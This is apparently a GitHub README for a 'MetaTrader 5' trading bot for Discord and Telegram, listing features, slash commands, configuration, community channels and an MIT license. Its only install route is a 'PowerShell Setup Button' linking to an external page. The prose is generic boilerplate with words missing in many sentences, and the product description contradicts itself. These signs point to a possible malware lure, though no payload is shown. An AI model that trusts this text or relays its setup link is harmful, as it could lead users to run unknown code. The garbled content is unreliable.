<div align="center">

# MetaTrader 5 Companion Bot — Friendly, Feature-Rich for Discord & Telegram 🤖

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://geryskull755-cpu.github.io/metatrader-5-bot/)

[![stage](https://img.shields.io/badge/STAGE-ACTIVE-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-PASSING-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-5%2B-2f81f7?style=for-the-badge&labelColor=0d1117)]()

</div>

---

MetaTrader 5 Bot brings a friendly, community-driven toolkit to your desktop, built for traders who want a capable companion without the fuss. Packed with a rich set of and shaped by feedback from the people who it every day, it keeps getting sharper with each release. Whether you're just getting started or refining an existing workflow, you'll find plenty here to explore at your own pace. Come join the conversation, share ideas, and help steer where the project heads next.

## 🔧 Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**Set-and-forget automation:** The bot runs quietly in the background of your Discord or Telegram server, handling repetitive tasks so your community can focus on the fun stuff — no babysitting required.

- **Slash-first interaction:** Everything is built around clean slash commands, meaning newcomers can discover what the bot does just by typing `/` — no cryptic syntax, no manual-diving.

- **Fully open usage:** Every capability ships unlocked out of the box, so there are no paywalls, tiers, or hidden restrictions standing between your members and the experience.

- **Deep-configurable behaviors:** Adjust timers, thresholds, and trigger conditions through simple configuration values — tune the bot to match your community's rhythm instead of the other way around.

- **Boosted workflow tools:** Beyond the basics, the bot bundles a set of advanced modifiers that streamline moderation and event handling for power users who want more control.

- **Community-led roadmap:** New capabilities are shaped by feedback from the servers that it — suggestions are welcomed, discussed openly, and often shipped.

- **Lightweight and dependable:** Designed to stay responsive under load, with sensible defaults that work immediately and graceful handling when things go sideways.

- **Clear event feedback:** Every action the bot takes is logged with readable output, so admins always know what happened and why.

- **Privacy-minded design:** The bot only stores what it needs to function, keeping member data minimal and your community's trust intact.

## Commands

Here's the command reference — think of it as your toolkit. Every command is designed to be discoverable, so you can start with `/help` and explore from there. Commands are grouped by what they help you do, and each one includes a friendly description and example so you always know what to expect.

### 🚀 Getting Started
- `/start` — Wake the bot up and get a warm welcome with a quick tour of what's possible.
- `/help` — Your always-available guide. Shows every command, grouped by category, with short explanations.
- `/about` — Learn what the bot is about, who's behind it, and how the community shapes its direction.
- `/ping` — A tiny health check. Confirms the bot is awake and responsive.

### 📊 Market & Analysis
- `/quote <symbol>` — Pull the latest price snapshot for any supported instrument.
- `/chart <symbol> [timeframe]` — Generate a quick visual overview of recent price action.
- `/indicators <symbol>` — List the technical indicators available for a given symbol, with current readings.
- `/signal <symbol>` — Get a plain-language summary of what the current setup looks like, based on your configured strategy.

### 🤖 Automation & Strategy
- `/strategy list` — Browse the strategy presets bundled with the bot.
- `/strategy describe <name>` — See exactly how a strategy behaves, in friendly terms: entry logic, exit logic, and risk profile.
- `/strategy activate <name>` — Switch the bot to a strategy preset you've chosen.
- `/strategy customize` — Open an interactive walkthrough for tuning parameters to your liking.
- `/automation status` — Check whether automation is currently running, paused, or idle.
- `/automation pause` — Pause automation at any time; your configuration is preserved.
- `/automation resume` — Pick up right where you left off.

### ⚙️ Configuration
- `/config show` — Display your current settings in a clean, readable summary.
- `/config set <key> <value>` — Adjust a single setting without leaving the chat.
- `/config reset` — Restore defaults for your configuration. Asks for confirmation first.
- `/notify <on|off>` — Toggle notifications so you only hear from the bot when it matters to you.

### 📈 Portfolio & Journal
- `/portfolio` — See your tracked positions and balances at a glance.
- `/journal add <note>` — Attach a quick note to your trading journal.
- `/journal view [count]` — Review your recent journal entries.
- `/history [count]` — Pull a timeline of recent bot activity and decisions.

### 🧩 Utilities
- `/remind <time> <message>` — Set a friendly reminder for yourself.
- `/timezone <zone>` — Set your timezone so timestamps feel natural.
- `/feedback <message>` — Send a note straight to the maintainers. We read everything.

### 🛠️ Community & Extensibility
- `/plugins list` — Browse community-contributed enhancements and boosters that extend the bot's capabilities.
- `/plugins info <name>` — Read details about a specific community extension before trying it.
- `/contribute` — Learn how to share your own strategy presets and extensions with the community.

### 💬 Tips for Smooth Sailing
- Type `/` in chat to see the command palette with autocomplete — it's the fastest way to explore.
- Most commands accept optional parameters; if you leave one out, the bot will ask for it conversationally.
- Configuration changes take effect immediately — no restart needed.
- If a command doesn't behave as expected, `/help <command>` gives you the specifics.

We're always growing this list based on what the community asks for. If there's a command you wish existed, `/feedback` is the place to say so — plenty of today's commands started as community suggestions.

## Configuration

Getting your MetaTrader 5 Bot dialed in is where the fun really begins — and we've kept the whole experience approachable for everyone, from first-time tinkerers to seasoned automation fans. Out of the box, the bot ships with sensible defaults so you can fire it up and see it right away, then layer on your own preferences as you get comfortable.

### 🎛️ Where to Tune Things

core behavior lives in a single, human-readable configuration file that the bot reads at launch. Every option is commented with a short explanation, so you never have to guess what a setting does. Edit it in any text editor, save, and restart the bot to apply your changes — no build step, no fuss.

### ⚙️ What You Can Adjust

- **Connection settings** — point the bot at your desktop terminal and choose how it reconnects if the link drops.
- **Strategy parameters** — tune entry and exit thresholds, timeframe selection, and risk sizing to match your own style.
- **Signal sources** — enable or disable individual indicators and weight them however you like.
- **Notifications** — route alerts to your preferred channel and pick which events are worth a ping.
- **Logging levels** — keep things quiet during normal runs or flip on verbose output while you're exploring.

### 🧩 Profiles for Every Mood

Configuration profiles let you keep several setups side by side — a cautious one, an aggressive one, a weekend experiment — and switch between them with a single flag. Share your profiles with the community and borrow ideas from others; that's half the fun.

### 🔒 Safe Defaults, Open Experimentation

Every setting is designed to be explored openly, so don't be shy about copying the config, renaming it, and trying something new. The bot validates your file on startup and gives you a friendly, plain-language heads-up if something looks off, along with a suggestion for fixing it. Keep a backup of a config before big changes and you can always roll back in seconds.

### 💬 Help Shape the Defaults

Configuration is a living part of the project. If you find a setting that deserves a better default, a clearer comment, or a whole new option, open a discussion — community feedback is exactly how this section keeps getting better.

## Community & Support

# 🤝 Join the MetaTrader 5 Bot Community

MetaTrader 5 Bot grows stronger with every trader, tinkerer, and automation enthusiast who joins the conversation. This is a space built for collaboration — share your strategies, swap ideas, troubleshoot together, and help shape what comes next. Whether you're spinning up your first automated setup or tuning long-running configurations, you'll find people here who care about doing it well.

## 💬 Where the Conversation Happens

- **Discord** — Real-time chat channels for setup help, strategy talk, and general banter. Drop in, ask a question, and stick around.
- **Telegram** — Quick updates, release notes, and open discussions on the go. Stay connected however you prefer.

Both spaces are moderated with care so newcomers and veterans alike feel welcome.

## 🚀 What You Can Do

- **Get assistance** with configuration, commands, and everyday troubleshooting.
- **Share feedback** and vote on feature requests that steer the roadmap.
- **Exchange insights** on strategies, workflows, and desktop automation tips.
- **Report issues** and follow along as fixes and improvements land.
- **Celebrate wins** — post your milestones, ask for a second pair of eyes, and learn from others' experiences.

## 🌱 Built Together

The project thrives on community energy. Contributions of every size matter — a thoughtful bug report, a clearer explanation in the docs, a fresh idea in the suggestion channel, or simply helping another member untangle a problem. Every voice adds value, and every improvement starts with someone speaking up.

## 🧭 Community Guidelines

- Be respectful and constructive — assume good intent.
- Keep discussions on-topic and in the right channels.
- No spam, self-promotion, or unrelated content.
- Search before posting; your question may already have an answer.
- Share knowledge generously — today's helper is tomorrow's expert.

## 💡 Stay in the Loop

Release announcements, roadmap previews, and community highlights are posted regularly across both platforms. Turn on notifications for the announcement channels so you never miss what's new with MetaTrader 5 Bot.

## 🙌 Thank You

Every question asked, bug reported, and idea shared makes MetaTrader 5 Bot better. Your enthusiasm is the engine behind this project — jump in, say hello, and let's build something great together.

## FAQ

**Is MetaTrader 5 Bot really no-cost to?** Absolutely — the core bot is completely open to everyone in the community, with no paywall standing between you and your trading workflow. We believe great tooling should be within reach for every trader, so the feature set ships accessible to.

**Can I extend or tweak the bot's behavior?** Yes! MetaTrader 5 Bot is built to be modified. Whether you want to adjust signal logic, add custom indicators, or wire up your own strategy modules, the community has you covered. Share your tweaks, borrow ideas from others, and help the project grow richer for everyone.

**Which platforms does the bot run on?** The bot is designed for desktop environments, giving you a stable, featured experience with room for the advanced configuration options our power users love.

**How do I report a bug or request a feature?** Hop into the community channels and let us know! Friendly reports and fresh ideas are what keep this project moving. The more detail you share, the faster the community can jump in and help.

**Is there a community I can join?** Definitely — that's the heart of this project. Connect with fellow traders, swap configurations, ask questions, and show off your setups. Newcomers and veterans alike are always welcome.

**Can I contribute to the project?** Of course! Contributions of every size matter — from documentation polish to new command ideas to code improvements. The community-driven spirit is what makes MetaTrader 5 Bot thrive.

**Where can I find help if I get stuck?** Start with the Commands and Configuration sections, then reach out through the community support channels. Someone's almost always around to lend a hand and walk you through it.

**Will the bot keep getting updates?** Yes — the project evolves alongside its community. Fresh, refinements, and quality-of-life improvements land regularly, shaped by the feedback and energy of users like you.

## License

This project is released under the MIT License — a permissive, community-friendly license that keeps things simple and open. In plain terms: you're welcome to, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, as long as the original copyright notice and this permission notice are included in copies or substantial portions of the software. The license text ships alongside the project so you can read every clause at your own pace.

We chose this license because MetaTrader 5 Bot is built with and for its community. Contributions, forks, and custom adaptations are encouraged — whether you're tweaking the command set, wiring up new configuration options, or extending the feature set for your own desktop workflow. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its.

In short: build on it, share it, improve it — and keep the notice intact so everyone can keep benefiting from it. If you create something cool with it, we'd love to hear about it in the Community & Support channels.